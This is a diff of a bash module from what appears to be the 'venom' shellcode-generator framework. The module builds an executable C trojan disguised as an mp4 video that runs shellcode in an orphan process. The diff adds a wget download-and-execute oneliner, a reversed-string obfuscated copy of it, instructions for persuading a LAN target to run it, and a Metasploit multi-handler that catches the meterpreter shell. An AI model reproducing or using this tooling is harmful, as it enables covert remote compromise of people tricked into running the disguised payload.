@@ -8143,6 +8143,7 @@ fi
 
 
 
+
 #
 # mp4-trojan horse 
 #
@@ -8181,7 +8182,7 @@ fi
 # Parse mp4 video name for transformation
 echo "$appl" > /tmp/test.txt
 N4m=$(grep -oE '[^/]+$' /tmp/test.txt) > /dev/null 2>&1
-echo "[☠] rename mp4 from: $N4m To: stream.mp4" && sleep 2
+echo "[☠] Rename mp4 from: $N4m To: stream.mp4" && sleep 2
 cp $appl $IPATH/output/stream.mp4 > /dev/null 2>&1
 
 
@@ -8198,7 +8199,7 @@ echo ""
 
 cd $IPATH/output
 # Build C program (trojan.mp4)
-echo "[☠] Building $mP4.c C Program .." && sleep 2
+echo "[☠] Building $mP4 C Program .." && sleep 2
 echo "#include<stdio.h>" > $mP4.c
 echo "#include<stdlib.h>" >> $mP4.c
 echo "#include<string.h>" >> $mP4.c
@@ -8239,7 +8240,7 @@ echo "      } return 0;" >> $mP4.c
 echo "}" >> $mP4.c
 
 
-## Compile C program
+## Compile/permitions/copy_to_apache2 ( C program )
 echo "[☠] Compile C program (MITRE ATT&CK T1036) .." && sleep 1
 gcc -fno-stack-protector -z execstack $IPATH/output/$mP4.c -o $IPATH/output/$mP4.mp4
 echo "[☠] Give execution permitions to agent .." && sleep 1
@@ -8253,47 +8254,72 @@ cd $IPATH
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$mP4.mp4\n\nchose how to deliver: $mP4.mp4" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "oneliner (download/exec)" --width 305 --height 220) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$mP4.mp4\n\nchose how to deliver: $mP4.mp4" --radiolist --column "Pick" --column "Option" FALSE "multi-handler (default)" TRUE "Oneliner (download/auto-exec)" --width 305 --height 220) > /dev/null 2>&1
 
 
-   if [ "$serv" = "multi-handler (default)" ]; then
-      echo "---"
-      echo "-   DESCRIPTION: This module will ask user to input one mp4 video file, stores it on apache2"
-      echo "-      webroot and builds one C program thats going to download/execute the inputed mp4 video"
-      echo "-      file and at the same time executes our shellcode in a chield process (orphan process)."
-      echo "-"
-      echo "-   ATTACK_VECTOR: sudo ./$mP4.mp4"
-      echo "---"
-      echo -n "[☠] Press any key to start a handler .."
-      read odf
-      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯] Please dont test samples on virus total..."
-      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+if [ "$serv" = "multi-handler (default)" ]; then
+
+   ## Print on terminal
+   echo "";echo "SOCIAL_ENGINEERING:"
+   echo "Persuade the target to run '$mP4.mp4' executable using their terminal."
+   echo "That will remote download/exec (LAN) our mp4 video file and auto executes"
+   echo "our C shellcode in an orphan process (deatch from mp4 video process)."
+   echo "REMARK: All files required by this module have been ported to apache2."
+   echo "";echo "MANUAL_EXECUTION:"
+   echo "sudo ./$mP4.mp4";echo ""
+   echo -n "[☠] Press any key to start a handler .."
+   read odf
+   echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+   echo "[☯] Please dont test samples on virus total .."
+   ## Is venom framework configurated to store logfiles?
+   if [ "$MsFlF" = "ON" ]; then
+      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/$mP4.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
    else
-      echo "---"
-      echo "-   DESCRIPTION: This module will ask user to input one mp4 video file, stores it on apache2"
-      echo "-      webroot and builds one C program thats going to download/execute the inputed mp4 video"
-      echo "-      file and at the same time executes our shellcode in a chield process (orphan process)."
-      echo "-"
-      echo "-   SOCIAL_ENGINEERING: Get target user (LAN) to execute the next oneliner on terminal."
-      echo "-   ONELINER: sudo wget http://$lhost/$mP4.zip && unzip $mP4.zip && sudo ./$mP4.mp4"
-      echo "---"
-      echo -n "[☠] Press any key to start a handler .."
-      read odf
-      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯] Please dont test samples on virus total..."
-      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
    fi
+
+else
+
+   ## Reverse original string (venom attack vector)
+   original_string="sudo wget http://$lhost/$mP4.zip;unzip $mP4.zip;./$mP4.mp4"
+   xterm -T " Reversing Original String (oneliner)" -geometry 110x23 -e "rev <<< \"$original_string\" > /tmp/reverse.txt"
+   reverse_original=`cat /tmp/reverse.txt`;rm -f /tmp/reverse.txt
+   
+   ## Print on terminal
+   echo "";echo "SOCIAL_ENGINEERING:"
+   echo "Persuade the target to run the 'oneliner' OR the 'oneliner_obfuscated' command"
+   echo "on their terminal. That will remote download/exec (LAN) our mp4 video file and"
+   echo "auto executes our C shellcode in an orphan process (deatch from mp4 video process)."
+   echo "";echo "ONELINER:"
+   echo "$original_string";echo ""
+   echo "ONELINER_OBFUSCATED:"
+   echo "echo Streaming:$mP4.mp4;rev <<< \"$reverse_original\"|\$0"
+   echo ""
+   echo -n "[☠] Press any key to start a handler .."
+   read odf
+   echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+   echo "[☯] Please dont test samples on virus total .."
+   ## Is venom framework configurated to store logfiles?
+   if [ "$MsFlF" = "ON" ]; then
+      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/$mP4.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+   else
+      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
+   fi
+
+fi
 
 
 # CLEANING EVERYTHING UP
-echo "[☠] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files .."
 sleep 2
 rm /tmp/test.txt > /dev/null 2>&1
 rm /tmp/stream.mp4 > /dev/null 2>&1
+rm /tmp/reverse.txt > /dev/null 2>&1
 rm $ApAcHe/$mP4.mp4 > /dev/null 2>&1
 rm $ApAcHe/$mP4.zip > /dev/null 2>&1
 rm $ApAcHe/stream.mp4 > /dev/null 2>&1
+rm $IPATH/output/$mP4.zip > /dev/null 2>&1
+rm $IPATH/output/stream.mp4 > /dev/null 2>&1
 sleep 2 && sh_menu
 
 
